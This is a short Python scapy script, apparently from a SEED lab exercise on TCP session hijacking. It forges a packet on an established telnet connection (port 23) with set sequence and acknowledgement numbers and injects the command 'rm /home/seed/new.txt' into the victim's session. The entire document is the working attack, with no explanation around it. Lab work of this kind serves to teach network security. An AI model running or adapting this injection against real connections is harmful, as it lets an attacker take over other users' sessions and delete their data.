#!/usr/bin/env python3
from scapy.all import *
ip = IP(src="10.9.0.6", dst="10.9.0.5")
tcp = TCP(sport=47464, dport=23, flags="A", seq=109603700, ack=224824803)
data = "\r rm /home/seed/new.txt\r"
pkt = ip/tcp/data
ls(pkt)
send(pkt, verbose=0)
